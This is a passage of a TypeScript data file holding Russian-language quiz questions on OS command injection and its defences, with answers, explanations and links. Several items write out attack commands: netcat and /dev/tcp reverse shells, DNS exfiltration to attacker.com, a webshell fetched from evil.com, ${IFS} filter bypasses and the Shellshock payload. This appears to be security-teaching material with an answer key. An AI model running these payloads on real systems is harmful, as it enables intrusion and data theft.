export interface QuizQuestion {
    question: string;
    answers: string[];
    correctAnswerIndex: number;
    explanation?: string;
    link?: {
        label: string;
        url: string;
    };
}

export const quizQuestions: QuizQuestion[] = [
    {
        question: "Что такое Command Injection?",
        answers: [
            "Уязвимость, позволяющая выполнение произвольных команд операционной системы на сервере",
            "Внедрение команд SQL для манипуляции базой данных",
            "Внедрение JavaScript кода для выполнения на стороне клиента",
            "Внедрение CSS стилей для изменения внешнего вида сайта",
            "Перехват управления сессией пользователя через cookies",
            "Атака на DNS сервер для подмены IP адресов",
            "Использование команд процессора для перегрева сервера"
        ],
        correctAnswerIndex: 0,
        explanation: "Command Injection (OS Command Injection) позволяет атакующему выполнять команды ОС с привилегиями приложения.",
        link: {
            label: "OWASP: Command Injection",
            url: "https://owasp.org/www-community/attacks/Command_Injection"
        }
    },
    {
        question: "Чем Command Injection отличается от Code Injection?",
        answers: [
            "Command Injection выполняет команды ОС (ls, ping), а Code Injection выполняет код языка программирования (PHP, Python) внутри приложения",
            "Ничем, это синонимы",
            "Command Injection безопаснее, так как работает только с файлами",
            "Code Injection работает только на скомпилированных языках, а Command Injection на скриптовых",
            "Command Injection требует прав администратора, Code Injection — нет",
            "Code Injection происходит только в базе данных, Command Injection — в веб-сервере",
            "Command Injection возможен только в Linux системах"
        ],
        correctAnswerIndex: 0,
        explanation: "Разница в исполнителе: Command Injection передает команды в sh/cmd, Code Injection исполняет код (eval) внутри интерпретатора языка.",
        link: {
            label: "Code Inj vs Command Inj",
            url: "https://owasp.org/www-community/attacks/Code_Injection"
        }
    },
    {
        question: "Какой символ используется для последовательного выполнения команд в Linux (игнорируя ошибки)?",
        answers: [
            "; (точка с запятой)",
            "& (амперсанд)",
            "&& (два амперсанда)",
            "| (пайп)",
            "|| (два пайпа)",
            "$ (доллар)",
            "# (решетка)"
        ],
        correctAnswerIndex: 0,
        explanation: "Символ `;` позволяет выполнять команды последовательно, независимо от успеха предыдущей (например `cmd1; cmd2`).",
        link: {
            label: "Linux Shell Operators",
            url: "https://www.gnu.org/software/bash/manual/html_node/Lists.html"
        }
    },
    {
        question: "Какой символ используется для выполнения команды в фоне в Linux?",
        answers: [
            "& (амперсанд)",
            "; (точка с запятой)",
            "| (пайп)",
            "$ (доллар)",
            ">> (двойная стрелка)",
            "&& (два амперсанда)",
            "% (процент)"
        ],
        correctAnswerIndex: 0,
        explanation: "`&` в конце команды запускает её в фоновом режиме (asynchronous execution).",
        link: {
            label: "Bash Background job",
            url: "https://www.gnu.org/software/bash/manual/html_node/Lists.html"
        }
    },
    {
        question: "Что делает оператор `|` (pipe) в Linux?",
        answers: [
            "Передает вывод (stdout) первой команды на вход (stdin) второй команды",
            "Запускает вторую команду только если первая выполнилась с ошибкой",
            "Удаляет результат выполнения первой команды",
            "Сохраняет вывод первой команды в файл",
            "Запускает команды параллельно на разных процессорах",
            "Сравнивает вывод двух команд",
            "Останавливает выполнение первой команды"
        ],
        correctAnswerIndex: 0,
        explanation: "Pipe `|` связывает stdout одной команды с stdin другой, позволяя создавать цепочки обработки данных.",
        link: {
            label: "Pipelines",
            url: "https://www.gnu.org/software/bash/manual/html_node/Pipelines.html"
        }
    },
    {
        question: "Что такое 'Blind Command Injection'?",
        answers: [
            "Когда результат выполнения команды не выводится в ответе HTTP, но команда выполняется",
            "Когда команда не выполняется из-за отсутствия прав",
            "Когда команда выполняется, но только в оперативной памяти",
            "Когда сервер выключен и не может ответить",
            "Когда атакующий не видит исходный код приложения",
            "Когда инъекция происходит в зашифрованном трафике",
            "Когда команда выполняется только при перезагрузке сервера"
        ],
        correctAnswerIndex: 0,
        explanation: "При Blind инъекции вывод команды не возвращается пользователю. Атакующий должен использовать косвенные признаки (время, DNS) для подтверждения.",
        link: {
            label: "PortSwigger: Blind OS Command Injection",
            url: "https://portswigger.net/web-security/os-command-injection#blind-os-command-injection"
        }
    },
    {
        question: "Как можно детектировать Blind Command Injection?",
        answers: [
            "Используя Time-based payloads (sleep, ping) или OOB (DNS/HTTP запросы наружу)",
            "Посмотреть логи ошибок веб-сервера через браузер",
            "Отправить запрос на сброс пароля администратора",
            "Использовать SQL-инъекцию для чтения файловой системы",
            "Попробовать загрузить веб-шелл и открыть его",
            "Спросить у администратора системы",
            "Проанализировать HTML код страницы на наличие комментариев"
        ],
        correctAnswerIndex: 0,
        explanation: "Задержка времени (`sleep 10`) или внешний запрос (`ping attacker.com`) позволяют подтвердить выполнение команды без видимого вывода.",
        link: {
            label: "Detecting Blind OS Injection",
            url: "https://portswigger.net/web-security/os-command-injection#detecting-blind-os-command-injection-using-time-delays"
        }
    },
    {
        question: "Какая команда вызывает задержку выполнения в Linux?",
        answers: [
            "sleep 10",
            "wait 10",
            "delay 10",
            "pause 10",
            "timeout 10",
            "hold 10",
            "stop 10"
        ],
        correctAnswerIndex: 0,
        explanation: "Команда `sleep` приостанавливает выполнение скрипта на заданное количество секунд.",
        link: {
            label: "Man page: sleep",
            url: "https://man7.org/linux/man-pages/man1/sleep.1.html"
        }
    },
    {
        question: "Какая команда часто используется для вызова задержки в Windows (без PowerShell)?",
        answers: [
            "timeout /t 10 или ping -n 11 127.0.0.1",
            "sleep 10",
            "wait 10",
            "delay 10",
            "pause 10",
            "suspend 10",
            "calc 10"
        ],
        correctAnswerIndex: 0,
        explanation: "В старых версиях Windows нет `sleep`. Используют `ping` на localhost (так как он делает 1 пинг в секунду) или `timeout`.",
        link: {
            label: "Command Injection Payloads",
            url: "https://github.com/payloadbox/command-injection-payload-list"
        }
    },
    {
        question: "Что такое 'Reverse Shell'?",
        answers: [
            "Оболочка, которая инициирует соединение от зараженного сервера к машине атакующего (обход входящего Firewall)",
            "Оболочка, которая переворачивает текст команд задом наперед",
            "Защищенная оболочка, работающая только в безопасном режиме",
            "Оболочка администратора, доступная только через VPN",
            "Оболочка, которая автоматически удаляет себя после использования",
            "Интерфейс для восстановления удаленных файлов",
            "Графическая оболочка для командной строки"
        ],
        correctAnswerIndex: 0,
        explanation: "Reverse Shell полезен, когда сервер находится за NAT или Firewall, блокирующим входящие соединения, но разрешающим исходящие.",
        link: {
            label: "Reverse Shell Cheat Sheet",
            url: "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
        }
    },
    {
        question: "Что такое 'Bind Shell'?",
        answers: [
            "Оболочка, которая открывает порт на сервере и ожидает входящего подключения от атакующего",
            "Оболочка, привязанная к конкретному пользователю системы",
            "Скрипт для связывания нескольких команд в одну",
            "Оболочка для подключения к базе данных",
            "Интерфейс для настройки сетевых адаптеров (binding)",
            "Зашифрованный канал связи внутри VPN",
            "Оболочка, работающая только локально"
        ],
        correctAnswerIndex: 0,
        explanation: "Bind Shell 'слушает' порт на жертве. Это часто блокируется фаерволами, которые запрещают произвольные входящие подключения.",
        link: {
            label: "Bind vs Reverse Shell",
            url: "https://www.acunetix.com/blog/articles/bind-shells-reverse-shells/"
        }
    },
    {
        question: "Какой инструмент часто используется для создания listener (слушателя) при Reverse Shell?",
        answers: [
            "Netcat (nc)",
            "Notepad++",
            "Calculator",
            "Paint",
            "Wireshark",
            "Burp Suite",
            "Nmap"
        ],
        correctAnswerIndex: 0,
        explanation: "Netcat (`nc -lvnp <port>`) — стандартный инструмент для приема соединений Reverse Shell.",
        link: {
            label: "Netcat manual",
            url: "https://linux.die.net/man/1/nc"
        }
    },
    {
        question: "Как выглядит простейшая команда для чтения файла паролей в Linux?",
        answers: [
            "cat /etc/passwd",
            "read passwords.txt",
            "show users",
            "get root",
            "type C:\\Windows\\System32\\config\\SAM",
            "select * from users",
            "ls -la /home"
        ],
        correctAnswerIndex: 0,
        explanation: "Файл `/etc/passwd` содержит список пользователей системы и доступен для чтения всем (обычно).",
        link: {
            label: "Linux /etc/passwd",
            url: "https://man7.org/linux/man-pages/man5/passwd.5.html"
        }
    },
    {
        question: "Какая функция в PHP опасна и может привести к Command Injection?",
        answers: [
            "system(), exec(), passthru(), shell_exec()",
            "echo(), print()",
            "mysql_connect(), pg_connect()",
            "include(), require()",
            "header(), setcookie()",
            "mail(), fputs()",
            "file_get_contents(), fopen()"
        ],
        correctAnswerIndex: 0,
        explanation: "Функции семейства `exec` передают строковый аргумент прямо в оболочку системы без санитизации.",
        link: {
            label: "PHP: Program Execution",
            url: "https://www.php.net/manual/en/book.exec.php"
        }
    },
    {
        question: "Как в Python безопасно вызывать команды ОС, чтобы избежать инъекций?",
        answers: [
            "Использовать модуль `subprocess` с `shell=False` и передавать аргументы списком",
            "Использовать `os.system()` с конкатенацией строк",
            "Использовать `popen()` с экранированием вручную",
            "Использовать `commands.getoutput()`",
            "Использовать `eval()`",
            "Использовать `exec()`",
            "Python не поддерживает безопасный вызов команд"
        ],
        correctAnswerIndex: 0,
        explanation: "Использование списка аргументов (`['ls', '-l', filename]`) и `shell=False` гарантирует, что аргументы не будут интерпретированы как часть команды.",
        link: {
            label: "Python subprocess security",
            url: "https://docs.python.org/3/library/subprocess.html#security-considerations"
        }
    },
    {
        question: "Можно ли обойти фильтр пробелов в Command Injection (Linux)?",
        answers: [
            "Да, используя `${IFS}`, `<`, `%09` (Tab) или перенаправление ввода",
            "Нет, пробел является обязательным разделителем команд",
            "Только в Windows системах",
            "Только если установлен специальный пакет 'space-bypass'",
            "Только через использование кириллических символов",
            "Нет, WAF всегда блокирует запросы без пробелов",
            "Да, но только если используется оболочка Zsh"
        ],
        correctAnswerIndex: 0,
        explanation: "Оболочка bash позволяет использовать альтернативные разделители, например переменную `${IFS}` (Internal Field Separator).",
        link: {
            label: "Bypassing Space Filters",
            url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space"
        }
    },
    {
        question: "Что такое `${IFS}` в контексте обхода фильтров?",
        answers: [
            "Внутренняя переменная разделителя полей в Shell (обычно пробел, таб, новая строка). Используется как замена пробелам",
            "Специальный символ файловой системы (Internet File System)",
            "Команда для проверки свободного места на диске",
            "Переменная для хранения IP адреса сервера",
            "Функция для шифрования трафика",
            "Интегрированная файловая служба Windows",
            "Системный вызов ядра Linux"
        ],
        correctAnswerIndex: 0,
        explanation: "`cat${IFS}/etc/passwd` будет интерпретировано как `cat /etc/passwd` если пробелы заблокированы.",
        link: {
            label: "IFS Variable",
            url: "https://bash.cyberciti.biz/guide/$IFS"
        }
    },
    {
        question: "Как объединить команды, если `;` и `&` заблокированы (Linux)?",
        answers: [
            "Использовать перевод строки (%0a) или подстановку команд через `command` или $(command)",
            "Это невозможно, так как это единственные разделители",
            "Использовать пробел как разделитель",
            "Использовать запятую",
            "Использовать двоеточие",
            "Сдаться и искать другую уязвимость",
            "Использовать символ табуляции"
        ],
        correctAnswerIndex: 0,
        explanation: "Символ новой строки (`\n`, `%0a`) также является разделителем команд в Linux shell.",
        link: {
            label: "Command Injection Bypasses",
            url: "https://github.com/payloadbox/command-injection-payload-list"
        }
    },
    {
        question: "Можно ли использовать `Backticks` (обратные кавычки) для инъекции?",
        answers: [
            "Да, текст в обратных кавычках выполняется как команда, а результат подставляется в строку",
            "Нет, обратные кавычки используются только для комментариев",
            "Только в SQL запросах",
            "Только в HTML атрибутах",
            "Да, но только в Windows",
            "Нет, это устаревший синтаксис, который больше не поддерживается",
            "Только внутри двойных кавычек"
        ],
        correctAnswerIndex: 0,
        explanation: "`echo `ls`` выполнит `ls`, подставит результат и выведет его через `echo`.",
        link: {
            label: "Command Substitution",
            url: "https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html"
        }
    },
    {
        question: "Какой инструмент часто используется для автоматизированного поиска Command Injection?",
        answers: [
            "Commix",
            "Sqlmap",
            "Nmap",
            "Wireshark",
            "Hydra",
            "John the Ripper",
            "Metasploit (модуль scanner/smb)"
        ],
        correctAnswerIndex: 0,
        explanation: "Commix (Command Injection Exploiter) — специализированный инструмент для поиска и эксплуатации CI.",
        link: {
            label: "Commix Tool",
            url: "https://github.com/commixproject/commix"
        }
    },
    {
        question: "Почему функция `escapeshellarg()` в PHP важна для защиты?",
        answers: [
            "Она оборачивает аргумент в одинарные кавычки и экранирует существующие кавычки, делая строку безопасной",
            "Она удаляет аргумент из команды",
            "Она выполняет команду в песочнице",
            "Она шифрует аргумент алгоритмом AES",
            "Она проверяет права доступа к файлу",
            "Она конвертирует аргумент в число",
            "Она логирует попытку выполнения команды"
        ],
        correctAnswerIndex: 0,
        explanation: "Это предотвращает выход за пределы строкового аргумента и добавление новых команд или операторов.",
        link: {
            label: "PHP escapeshellarg",
            url: "https://www.php.net/manual/en/function.escapeshellarg.php"
        }
    },
    {
        question: "Что такое 'Argument Injection'?",
        answers: [
            "Когда нельзя выполнить новую команду, но можно добавить (инъецировать) новые аргументы к существующей утилите",
            "Внедрение в спор в комментариях кода",
            "Передача неправильных типов данных в функцию",
            "Логическая ошибка в аргументации бизнес-логики",
            "Атака на аргументы командной строки ядра при загрузке",
            "Подмена значений переменных окружения",
            "Переполнение буфера аргументов"
        ],
        correctAnswerIndex: 0,
        explanation: "Например, добавив `--checkpoint-action=exec=sh` в команду `tar`, можно добиться выполнения произвольного кода.",
        link: {
            label: "Argument Injection Vectors",
            url: "https://sonarsource.github.io/rspec-command-injection-test/"
        }
    },
    {
        question: "Как через утилиту `find` можно выполнить произвольную команду?",
        answers: [
            "Используя аргумент `-exec <команда> \;`",
            "find / -name shell -run",
            "find --execute-script",
            "find /System/cmd.exe",
            "find -R (recursive execute)",
            "Это невозможно, find только ищет файлы",
            "Используя флаг --delete"
        ],
        correctAnswerIndex: 0,
        explanation: "`find` имеет мощную (и опасную) опцию `-exec`, которая выполняет указанную команду для каждого найденного файла.",
        link: {
            label: "GTFOBins: find",
            url: "https://gtfobins.github.io/gtfobins/find/"
        }
    },
    {
        question: "Как через `tar` можно выполнить команду (Wildcard Injection)?",
        answers: [
            "Если есть файлы с именами-флагами (например `--checkpoint-action=exec=sh`) и команда использует wildcard (*)",
            "tar -xvf shell.sh",
            "tar --run-script payload.sh",
            "tar -z (zip execution)",
            "tar --exploit",
            "Это невозможно, tar только для архивов",
            "Через переполнение буфера в заголовке архива"
        ],
        correctAnswerIndex: 0,
        explanation: "Если в папке лежат файлы с именами, совпадающими с флагами tar, и используется `tar *`, tar воспримет их как настройки.",
        link: {
            label: "Tar Wildcard Injection",
            url: "https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/"
        }
    },
    {
        question: "Что возвращает команда `whoami`?",
        answers: [
            "Имя текущего пользователя, под которым работает процесс оболочки",
            "IP адрес текущего сервера",
            "Имя хоста компьютера",
            "Версию операционной системы",
            "Список всех пользователей в системе",
            "Путь к текущей директории",
            "Время работы системы (uptime)"
        ],
        correctAnswerIndex: 0,
        explanation: "`whoami` — стандартная команда для быстрой проверки контекста безопасности (root или www-data?).",
        link: {
            label: "Man page: whoami",
            url: "https://man7.org/linux/man-pages/man1/whoami.1.html"
        }
    },
    {
        question: "Что возвращает команда `id`?",
        answers: [
            "Информацию о пользователе (uid), основной группе (gid) и дополнительных группах",
            "Уникальный идентификатор сессии HTTP",
            "ID процессора",
            "ID процесса (PID)",
            "Серийный номер жесткого диска",
            "IP адрес и MAC адрес",
            "Версию ядра Linux"
        ],
        correctAnswerIndex: 0,
        explanation: "`id` дает больше информации, чем `whoami`, показывая принадлежность к группам (например, `wheel` или `sudo`).",
        link: {
            label: "Man page: id",
            url: "https://man7.org/linux/man-pages/man1/id.1.html"
        }
    },
    {
        question: "Как прочитать файл, если команда `cat` заблокирована/удалена?",
        answers: [
            "Использовать more, less, head, tail, vi, grep, awk, sed, rev, tac или dd",
            "Это невозможно, cat — единственная команда чтения",
            "Только через текстовый редактор Nano",
            "Только скачав файл через wget",
            "Только если установлен Python",
            "Перезагрузить сервер",
            "Попросить админа прислать файл по почте"
        ],
        correctAnswerIndex: 0,
        explanation: "В Linux существует множество утилит, способных выводить содержимое файла. `tac` (cat наоборот), `rev` (реверс строк), `head` и т.д.",
        link: {
            label: "Reading files without cat",
            url: "https://medium.com/@minimalist.asura/reading-files-without-cat-command-8e945c78663c"
        }
    },
    {
        question: "Что делает команда `nc -e /bin/sh LHOST LPORT`?",
        answers: [
            "Запускает Reverse Shell, перенаправляя ввод/вывод оболочки /bin/sh через сетевое соединение",
            "Сканирует порты на удаленном хосте LHOST",
            "Отправляет файл /bin/sh на удаленный сервер",
            "Проверяет доступность порта LPORT",
            "Создает зашифрованный туннель",
            "Обновляет netcat до последней версии",
            "Ничего, это невалидный синтаксис"
        ],
        correctAnswerIndex: 0,
        explanation: "Опция `-e` (execute) заставляет netcat выполнить программу после соединения. Часто отключена в безопасных версиях nc (OpenBSD netcat).",
        link: {
            label: "Netcat Reverse Shell",
            url: "https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
        }
    },
    {
        question: "Как получить Reverse Shell через netcat, если флаг `-e` недоступен?",
        answers: [
            "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT > /tmp/f",
            "Это невозможно без флага -e",
            "Использовать `nc -c /bin/sh`",
            "Использовать `telnet` вместо `nc`",
            "Перекомпилировать ядро Linux",
            "Загрузить статически скомпилированный nc",
            "Использовать `bash -i >& /dev/tcp/IP/PORT 0>&1` (если bash поддерживает tcp)"
        ],
        correctAnswerIndex: 0,
        explanation: "Использование именованных каналов (named pipes / mkfifo) позволяет перенаправить ввод/вывод shell обратно в netcat.",
        link: {
            label: "Reverse Shell w/o -e",
            url: "https://workstation-eng-team.guru/netcat-without-e-flag-reverse-shell/"
        }
    },
    {
        question: "Какая уязвимость CVE-2014-6271 широко известна как?",
        answers: [
            "Shellshock (уязвимость в Bash при парсинге переменных окружения)",
            "Heartbleed (OpenSSL)",
            "Poodle (SSLv3)",
            "Spectre (CPU)",
            "Meltdown (CPU)",
            "EternalBlue (SMB)",
            "Log4Shell (Log4j)"
        ],
        correctAnswerIndex: 0,
        explanation: "Shellshock позволял выполнять команды, добавляя их после определения функции в переменных окружения. `env x='() { :;}; echo vulnerable' bash -c ...`",
        link: {
            label: "Shellshock Vulnerability",
            url: "https://en.wikipedia.org/wiki/Shellshock_(software_bug)"
        }
    },
    {
        question: "Можно ли получить Command Injection через имя файла при загрузке (File Upload)?",
        answers: [
            "Да, если имя файла подставляется в команду обработки (например, ImageMagick convert) без экранирования",
            "Нет, имя файла не может быть командой",
            "Только если файл имеет расширение .exe",
            "Только если загружать файл в системную директорию",
            "Нет, современные ОС запрещают такие имена",
            "Только в Windows 98",
            "Да, но только для PHP файлов"
        ],
        correctAnswerIndex: 0,
        explanation: "Имя файла `image; sleep 10.jpg` может привести к выполнению `sleep 10` при обработке скриптом.",
        link: {
            label: "Command Inj via File Upload",
            url: "https://book.hacktricks.xyz/pentesting-web/file-upload"
        }
    },
    {
        question: "Что такое `ImageTragick`?",
        answers: [
            "Серия уязвимостей в библиотеке ImageMagick, позволяющая RCE при обработке специально подготовленных картинок",
            "Графический редактор для хакеров",
            "Вирус, шифрующий картинки",
            "Плагин для Photoshop",
            "Метод стеганографии",
            "Уязвимость в формате JPEG",
            "Инструмент для создания мемов"
        ],
        correctAnswerIndex: 0,
        explanation: "Уязвимость заключалась в недостаточной фильтрации имен файлов и делегатов (внешних программ) в ImageMagick.",
        link: {
            label: "ImageTragick Website",
            url: "https://imagetragick.com/"
        }
    },
    {
        question: "Как в Windows выполнить несколько команд последовательно?",
        answers: [
            "& (cmd1 & cmd2), && (если успех), || (если ошибка)",
            "Только ; (точка с запятой)",
            "Только через создание .bat файла",
            "Только Newline",
            "Через запятую",
            "В Windows нельзя выполнить несколько команд в одну строку",
            "Используя ключевое слово THEN"
        ],
        correctAnswerIndex: 0,
        explanation: "Синтаксис cmd.exe отличается от bash. `&` работает аналогично `;` в Linux (безусловное выполнение).",
        link: {
            label: "Windows CMD Command Separators",
            url: "https://ss64.com/nt/syntax-redirection.html"
        }
    },
    {
        question: "Работает ли команда `ls` в командной строке Windows (cmd.exe)?",
        answers: [
            "В стандартном cmd.exe нет (нужно `dir`), но в PowerShell `ls` является алиасом для `Get-ChildItem`",
            "Да, ls работает везде",
            "Нет, Windows не поддерживает листинг файлов",
            "Только в Windows 11",
            "Только если установить Linux Subsystem",
            "Да, но она называется `list`",
            "Только для администраторов"
        ],
        correctAnswerIndex: 0,
        explanation: "Это классический способ определить ОС при слепой инъекции: `ping` (Linux) vs `dir` (Win) vs `ls`.",
        link: {
            label: "Windows DIR command",
            url: "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir"
        }
    },
    {
        question: "Что такое `nslookup` и почему он полезен при тестировании?",
        answers: [
            "Утилита для DNS запросов. Часто используется для OOB (Out-of-Band) эксфильтрации данных и детекта слепых инъекций",
            "Утилита для поиска файлов на диске",
            "Инструмент для поиска людей в соцсетях",
            "Браузер командной строки",
            "Сканер уязвимостей",
            "Программа для настройки монитора",
            "База данных доменов"
        ],
        correctAnswerIndex: 0,
        explanation: "Разрешен во многих фаерволах (порт 53 UDP). Отлично подходит для проверки Blind Injection.",
        link: {
            label: "OOB Data Exfiltration",
            url: "https://portswigger.net/burp/application-security-testing/oast"
        }
    },
    {
        question: "Как передать данные через OOB DNS (DNS Exfiltration)?",
        answers: [
            "nslookup `whoami`.attacker.com (результат whoami становится поддоменом, и приходит на DNS сервер атакующего)",
            "nslookup --data `whoami` attacker.com",
            "ping attacker.com/`whoami`",
            "curl attacker.com --upload `whoami`",
            "dns --send `whoami`",
            "Это невозможно, DNS только для IP адресов",
            "Используя TXT записи"
        ],
        correctAnswerIndex: 0,
        explanation: "Атакующий контролирует DNS для домена `attacker.com` и видит запрос `root.attacker.com` в логах, узнавая, что `whoami` вернуло `root`.",
        link: {
            label: "DNS Exfiltration Technique",
            url: "https://www.akamai.com/blog/security/introduction-to-dns-data-exfiltration"
        }
    },
    {
        question: "Что такое 'Polyglot' command injection payload?",
        answers: [
            "Пейлоад, который корректно работает и закрывает контексты в разных языках/оболочках сразу (bash, sh, python, quote closure)",
            "Пейлоад, переведенный на разные языки мира",
            "Очень длинная команда",
            "Команда, состоящая только из спецсимволов",
            "Вирус, заражающий файлы разных форматов",
            "Скрипт, который учится на поведении пользователя",
            "Такого термина нет"
        ],
        correctAnswerIndex: 0,
        explanation: "Используется для фаззинга, когда неизвестен точный контекст (внутри кавычек, двойных, или вообще без них).",
        link: {
            label: "Polyglot Payloads",
            url: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#polyglot-command-injection"
        }
    },
    {
        question: "В чем главная опасность запуска веб-сервера от пользователя root?",
        answers: [
            "При Command Injection (RCE) атакующий сразу получает полные права над системой без необходимости повышения привилегий",
            "Сервер потребляет больше памяти",
            "Нельзя создавать файлы",
            "Это нарушает лицензионное соглашение",
            "Сложнее настроить SSL сертификаты",
            "Веб-сервер будет работать медленнее",
            "Нет опасности, это стандартная практика"
        ],
        correctAnswerIndex: 0,
        explanation: "Принцип наименьших привилегий (Least Privilege) — база безопасности. Веб-сервер должен работать от пользователя с минимальными правами (обычно `www-data`).",
        link: {
            label: "CWE-250: Execution with Unnecessary Privileges",
            url: "https://cwe.mitre.org/data/definitions/250.html"
        }
    },
    {
        question: "Как ограничить права веб-приложения для защиты от последствий RCE?",
        answers: [
            "Запускать от отдельного пользователя (www-data), использовать chroot, контейнеры, SELinux/AppArmor",
            "Запускать от root, но с длинным паролем",
            "Удалить всех других пользователей",
            "Запретить доступ в интернет",
            "Использовать только Windows Server",
            "Перезагружать сервер каждые 5 минут",
            "Отключить клавиатуру на сервере"
        ],
        correctAnswerIndex: 0,
        explanation: "Изоляция процесса (Sandbox) и ограничение прав доступа к файловой системе минимизируют ущерб от успешной атаки.",
        link: {
            label: "Docker Security Cheat Sheet",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html"
        }
    },
    {
        question: "Что такое `curl ... | bash`?",
        answers: [
            "Популярный (но опасный) способ установки ПО: скачивание скрипта и немедленная передача его в bash на исполнение",
            "Команда для тестирования скорости интернета",
            "Способ скачать видео с YouTube",
            "Команда для проверки SSL сертификатов",
            "Метод сжатия файлов",
            "Способ отправить email",
            "Настройка прокси сервера"
        ],
        correctAnswerIndex: 0,
        explanation: "Опасно тем, что вы не видите код перед исполнением. Если источник (сайт или сеть) скомпрометирован, выполняется вредоносный код.",
        link: {
            label: "Don't Pipe to your Shell",
            url: "https://www.idontplaydarts.com/2016/04/detecting-curl-pipe-bash-server-side/"
        }
    },
    {
        question: "Можно ли использовать `wget` для эксплуатации Command Injection?",
        answers: [
            "Да, можно загрузить Webshell со своего сервера в публичную директорию жертвы, чтобы потом его вызвать",
            "Нет, wget только качает файлы, он безопасен",
            "Только через переполнение буфера",
            "Только для чтения Google",
            "Нет, wget удален из современных Linux",
            "Только если wget запущен от root",
            "Да, но только для DoS атак"
        ],
        correctAnswerIndex: 0,
        explanation: "`wget http://evil.com/shell.php -O /var/www/html/shell.php` — классический сценарий закрепления в системе.",
        link: {
            label: "GTFOBins: wget",
            url: "https://gtfobins.github.io/gtfobins/wget/"
        }
    },
    {
        question: "Что такое `awk` injection?",
        answers: [
            "Если данные пользователя попадают в скрипт awk, можно использовать функцию `system()` внутри awk для выполнения команд",
            "Ошибка в программе awk, вызывающая падение",
            "Инъекция в текстовый файл",
            "Способ форматирования текста",
            "Уязвимость в драйверах клавиатуры",
            "Тип SQL инъекции",
            "Нет такого"
        ],
        correctAnswerIndex: 0,
        explanation: "Awk — это полноценный язык. Конструкция `awk '{ system(\"ls\") }'` выполнит команду ls.",
        link: {
            label: "GTFOBins: awk",
            url: "https://gtfobins.github.io/gtfobins/awk/"
        }
    },
    {
        question: "Как защититься от Command Injection на уровне WAF (Web Application Firewall)?",
        answers: [
            "Настроить правила блокировки ключевых слов (cat, /etc/passwd, system) и опасных символов (; | ` $)",
            "Заблокировать все POST запросы",
            "Заблокировать доступ с IP адресов Tor",
            "Включить HTTPS",
            "Использовать капчу на каждом запросе",
            "Запретить использование браузера Chrome",
            "Блокировать пользователей с Linux"
        ],
        correctAnswerIndex: 0,
        explanation: "WAF — это эшелонированная защита, но не панацея, так как существуют способы обхода (obfuscation, encoding).",
        link: {
            label: "ModSecurity WAF",
            url: "https://github.com/SpiderLabs/ModSecurity"
        }
    },
    {
        question: "Является ли фильтрация черным списком (Blacklisting) хорошей защитой?",
        answers: [
            "Нет, фильтры часто можно обойти новыми методами. Лучше избегать вызова системных команд архитектурно",
            "Да, это идеальная защита",
            "Да, если список очень большой",
            "Иногда, зависит от погоды",
            "Для Windows да, для Linux нет",
            "Это единственный способ защиты",
            "Черные списки лучше белых"
        ],
        correctAnswerIndex: 0,
        explanation: "Blacklist (запрет плохого) всегда проигрывает Whitelist (разрешение только хорошего), так как атакующий всегда найдет незапрещенный вариант.",
        link: {
            label: "OWASP Input Validation",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"
        }
    },
    {
        question: "Какие библиотеки лучше использовать вместо прямых вызовов system()?",
        answers: [
            "Специализированные API для задачи (например, Imagick для картинок, библиотеки архивации, SMTP клиенты)",
            "Другие функции типа exec(), passthru()",
            "Самописные bash скрипты",
            "Никакие, system() самый надежный",
            "Сторонние непроверенные npm пакеты",
            "Библиотеки для майнинга крипты",
            "Функции eval()"
        ],
        correctAnswerIndex: 0,
        explanation: "Использование нативных библиотек языка устраняет необходимость обращения к оболочке ОС, закрывая класс уязвимостей Command Injection.",
        link: {
            label: "Safe coding practices",
            url: "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"
        }
    },
    {
        question: "Можно ли выполнить RCE через SQL Injection?",
        answers: [
            "Да, если есть права и функции типа xp_cmdshell (MSSQL) или возможность записи UDF / файлов (MySQL)",
            "Нет, SQL только для баз данных",
            "Только в базе данных Oracle",
            "Только в MS Access",
            "Только если база данных на дискете",
            "Нет, это миф",
            "Только через NoSQL инъекции"
        ],
        correctAnswerIndex: 0,
        explanation: "`xp_cmdshell` в MSSQL позволяет выполнять команды ОС из SQL запроса. Это мостик от SQLi к RCE.",
        link: {
            label: "MSSQL xp_cmdshell",
            url: "https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql"
        }
    },
    {
        question: "Что такое 'Environment Variable Injection'?",
        answers: [
            "Изменение переменных окружения (LD_PRELOAD, PATH) перед запуском команды, что может привести к подмене библиотек или бинарников",
            "Инъекция загрязнения в окружающую среду",
            "Внедрение зеленых технологий в датацентры",
            "Атака на систему кондиционирования серверной",
            "Изменение погоды в игре",
            "Подмена HTTP заголовков",
            "Сброс настроек BIOS"
        ],
        correctAnswerIndex: 0,
        explanation: "Пример: через `LD_PRELOAD` можно заставить программу загрузить вредоносную библиотеку (.so) вместо системной.",
        link: {
            label: "LD_PRELOAD exploit",
            url: "https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/"
        }
    },
    {
        question: "Как защититься от атаки через подмену пути (PATH Manipulation)?",
        answers: [
            "Использовать абсолютные пути к бинарникам (например `/bin/ls` вместо `ls`) и очищать environment при запуске",
            "Не использовать переменную PATH вообще",
            "Удалить все файлы из /bin",
            "Запускать сервер на Windows",
            "Назвать бинарники случайными именами",
            "Запретить пользователю менять директории",
            "Использовать относительные пути (./ls)"
        ],
        correctAnswerIndex: 0,
        explanation: "Если использовать просто `ls`, система ищет его в папках из `$PATH`. Атакующий может добавить свою папку в начало `$PATH` и подсунуть свой вредоносный `ls`.",
        link: {
            label: "PATH Variable Security",
            url: "https://www.linux.com/training-tutorials/linux-security-tips-protecting-path-variable/"
        }
    },
    {
        question: "Что такое `chroot`?",
        answers: [
            "Смена корневого каталога для процесса, ограничивающая доступ к остальной файловой системе (Jail)",
